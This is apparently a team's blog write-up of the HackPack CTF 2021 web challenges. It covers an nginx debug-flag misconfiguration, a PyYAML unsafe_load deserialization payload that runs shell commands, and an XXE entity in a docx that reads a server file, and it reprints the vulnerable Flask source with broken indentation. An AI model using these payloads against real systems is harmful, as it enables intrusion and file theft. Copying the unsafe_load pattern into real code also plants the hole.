---
title: HackPack CTF 2021
tags: yaml nginx xxe 
---

# Web Writeups

![](/img/hackpack/solved.png)


Hello there we (fr334aks) took part in hackpack CTF 2021 and ended up solving all the available Web challenges,
here are our writeups for them.


## "N"ot "G"am"I"ng a"N"ymore in "X"mas 

### Challenge

![](/img/hackpack/nginx.png)


### Solution 

- tried a random name as password and used the network tab in dev options to inspect the requests
found a post request with data as `debug=0` changed that to `debug=1`  
as 

![](/img/hackpack/network.png)

and

![](/img/hackpack/hackbar.png)


which revealed the default `nginx.conf` file revealing a hidden directory `/maybehereimportantstuff` ,visiting it we are met with the flag 

![](/img/hackpack/flag1.png)


> Flag : flag{ng1nx_m1sconf1g_c4n_b3_h4rmful}



## Yaml-2-json


### Challenge

![](/img/hackpack/yaml.png)


### Solution 

full writeup for this challenge can be found here from [Saudi](https://twitter.com/trevorsaudi),  [Yaml-2-Json](https://trevorsaudi.medium.com/yaml-2-json-hackpack-ctf-7de28ef0ecff)


instead of repeating what he did i will just share the main.py file here :joy:

having gained RCE on the CTF instance i further deciced to explore a bit further

using the exploit as 

```
flag: !!python/object/apply:subprocess.check_output
       args: [ ls -lah ]
       kwds: { shell: true }
```
i was able to view all the files in the directory 

```
total 36K 
drwxr-xr-x 1 root root 4.0K Apr 14 22:17 .
drwxr-xr-x 1 root root 4.0K Apr 14 22:25 ..
-rw-rw-r-- 1 root root   30 Apr 14 22:16 .env
drwxrwxr-x 6 root root 4.0K Apr 14 22:16 .venv
drwxrwxr-x 2 root root 4.0K Apr 14 22:16 __pycache__
-rw-rw-r-- 1 root root  778 Apr 14 22:16 main.py
-rw-r--r-- 1 root root  204 Dec  6 18:41 prestart.sh
-rw-rw-r-- 1 root root  131 Apr 14 22:16 requirements.txt
drwxrwxr-x 2 root root 4.0K Apr 14 22:16 templates
```

decided to retrieve the source code `main.py`

using 

```
flag: !!python/object/apply:subprocess.check_output
       args: [ cat main.py ]
       kwds: { shell: true }
```

beautified code is below, enjoy your further analysis 


```python
from flask import Flask, render_template, make_response
from flask.globals import request
import yaml
import os
from dotenv import load_dotenv

app = Flask(__name__)
@app.route('', methods = ['GET'])

def index():
    premium = request.cookies.get('premium')
    resp = make_response(render_template("index.html", premium = premium == 'true'))

	if premium is None:
    resp.set_cookie('premium', 'false')

	return resp
@ papp.route('', methods = ['POST'])

def parse():
    load_dotenv()
premium = request.cookies.get('premium')
data = request.form['yaml']
if premium == 'true':
    json = yaml.unsafe_load(data)
else :
    json = yaml.load(data, yaml.BaseLoader)
return render_template("index.html", json = json, premium = premium == 'true')
```

## All about resetting 

### Challenge

![](/img/hackpack/resetting.png)

### solution

- Writeup by Mystik0ri0n [All-about-resetting](https://ctftime.org/writeup/27479)

## Indead V1

### Challenge

![](/img/hackpack/indead1.png)

### solution 

- Writeup by Saudi [indeadv1](https://trevorsaudi.medium.com/indead-hackpack-ctf-1b3878120da5)

- Writeup by Mystik0ri0n [Indead-v1](https://ctftime.org/user/104258)



## Indead V2 

### Challenge 

![](/img/hackpack/indead2.png)
 

interface 

![](/img/hackpack/interface.png)


### Solution 

- This was a interesting challenge where we are to take advantage of a vulnerable docx parser to trigger XXE to file inclusion,
armed with the flag location `/var/www/flag.txt` we can proceed to crack a malicious docx file that retrieves the flag for us when parsed.

started by creating a simple resume.docx file.

![](/img/hackpack/resume.png)

unzipped the file contents and changed the values of document.xml to include our payload as 

![](/img/hackpack/xxe.png)

our modifications to the document included `<!DOCTYPE test [<!ENTITY test SYSTEM 'file:///var/www/flag.txt'>]>`

and also changing our only info in the document to call our payload when parsed

`<w:t xml:space="preserve">&test;</w:t></w:r>`

and then later zipping the contents back before uploading 

```
┌─[@parrot]─[~/Desktop/CTFs/hackpack]
└──╼ $zip resume.docx word/document.xml 
updating: word/document.xml (deflated 59%)
```

uploading the malicous document as our resume gets us the flag 

![](/img/hackpack/flag3.png)

> Flag : flag{XML_is_ancestor_0f_every7hing_do_you_agree_?} 


## Further Reading and references


- [ddosecurity,XXE](https://doddsecurity.com/312/xml-external-entity-injection-xxe-in-opencats-applicant-tracking-system/)

- [hacktricks,nginx](https://book.hacktricks.xyz/pentesting/pentesting-web/nginx)

- [kage,0x00sec.insecure file upload](https://0x00sec.org/t/insecure-file-upload-vulnerability/21448#:~:text=Insecure%20File%20Upload%20vulnerability%20is,system%20likef%20a%20reverse%20shell.&text=Let's%20look%20at%20the%20different,against%20Insecure%20File%20Upload%20vulnerabilities.)

Thank you for your time. 
for any errors and corrections kindly reach me on twitter [@k0imet_](https://twitter.com/k0imet_)